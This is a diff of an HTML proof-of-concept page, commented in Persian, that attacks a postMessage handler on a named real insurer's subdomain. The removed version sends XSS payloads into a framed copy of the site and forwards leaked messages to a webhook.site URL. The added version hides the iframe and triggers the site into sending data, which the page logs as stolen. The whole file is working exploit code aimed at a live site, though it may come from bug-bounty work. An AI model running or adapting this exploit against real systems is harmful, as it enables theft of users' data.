@@ -1,70 +1,44 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Testbed for postMessage Exploit - Fixed</title>
+    <title>PoC - Information Leakage via PostMessage</title>
 </head>
 <body>
-  <h1>Testbed for postMessage Exploit</h1>
-  <p>Victim iframe (may be blocked by CORS):</p>
-  <iframe id="victim-iframe" src="https://casers-dv1.geico.com/" style="width:100%; height:500px; border:1px solid red;"></iframe>
-  <br>
-  <button onclick="manualExploit()">Manual Trigger Exploit</button>
-  <pre id="log"></pre> <!-- برای log ها -->
-  <script>
-    function log(msg) {
-      document.getElementById('log').textContent += new Date().toLocaleTimeString() + ': ' + msg + '\n';
-      console.log(msg);
-    }
+    <h2>اثبات آسیب‌پذیری نشت اطلاعات - لطفا کنسول را چک کنید</h2>
+    
+    <iframe id="victimFrame" src="https://casers-dv1.geico.com/" style="width:1px; height:1px; border:none; visibility:hidden;"></iframe>
 
-    document.addEventListener('DOMContentLoaded', function() {
-      var iframe = document.getElementById('victim-iframe');
-      iframe.onload = function() {
-        log('Iframe loaded (but postMessage may fail due to CORS).');
-        // صبر کوتاه برای init victim
-        setTimeout(function() {
-          var maliciousPayload = JSON.stringify({
-            action: "Initialized",
-            // Payload XSS ساده – اگر victim eval یا innerHTML کنه، alert می‌پره
-            userInput: '"><svg onload=alert("XSS in Victim! Domain: "+document.domain)>',
-            extraData: "Malicious data to pollute"
-          });
-          
-          try {
-            iframe.contentWindow.postMessage(maliciousPayload, "*");
-            log('Payload sent! Check victim console for "Parsed Message Data".');
-          } catch (err) {
-            log('Error sending payload: ' + err.message);  // CORS error
-          }
-          
-          // Capture response از victim (اگر wildcard response بفرسته)
-          window.addEventListener('message', function(e) {
-            log('Leaked from victim: ' + e.data);
-            if (e.data && e.data.includes('Adjuster Context')) {
-              // Silent exfil (جایگزین your-server.com با webhook خودت، مثل webhook.site)
-              fetch('https://webhook.site/your-unique-id?leak=' + encodeURIComponent(e.data))
-                .then(() => log('Data leaked to webhook!'))
-                .catch(() => log('Exfil failed.'));
+    <script>
+        var victim = document.getElementById("victimFrame").contentWindow;
+
+        // شنود کننده برای دریافت هرگونه پیام ارسالی از iFrame
+        window.addEventListener("message", function(event) {
+            
+            console.log("--- پیام دریافتی (Captured Message) ---");
+            
+            try {
+                var stolenData = JSON.parse(event.data);
+                
+                // این قسمت داده‌های نشت شده (مانند eventID) را نمایش می‌دهد 
+                console.log("✅ داده‌های حساس نشت شده:", stolenData);
+                alert("Data Leak Success! Check Console for JSON Payload.");
+                
+            } catch (e) {
+                console.warn("Received non-JSON data or unexpected format.");
             }
-          });
-        }, 2000);
-      };
-      
-      iframe.onerror = function() {
-        log('Iframe failed to load (CORS?). Use manual trigger.');
-      };
-    });
+        });
 
-    // Manual exploit برای تست بدون onload
-    function manualExploit() {
-      var iframe = document.getElementById('victim-iframe');
-      var payload = JSON.stringify({action: "Initialized", xss: '"><script>alert("Manual XSS Test")</script>'});
-      try {
-        iframe.contentWindow.postMessage(payload, "*");
-        log('Manual payload sent!');
-      } catch (err) {
-        log('Manual error: ' + err.message);
-      }
-    }
-  </script>
+        // ارسال پیام ماشه‌کش (Trigger) برای مجبور کردن iFrame به ارسال پاسخ
+        document.getElementById("victimFrame").onload = function() {
+            console.log("Target loaded, sending trigger...");
+            
+            // این Payload دقیقا همان چیزی است که کد آسیب‌پذیر انتظار دارد
+            var triggerPayload = JSON.stringify({ action: "Initialized" });
+            
+            // پیام به iFrame ارسال می‌شود
+            victim.postMessage(triggerPayload, "*"); 
+            console.log("Trigger Payload sent.");
+        };
+    </script>
 </body>
 </html>
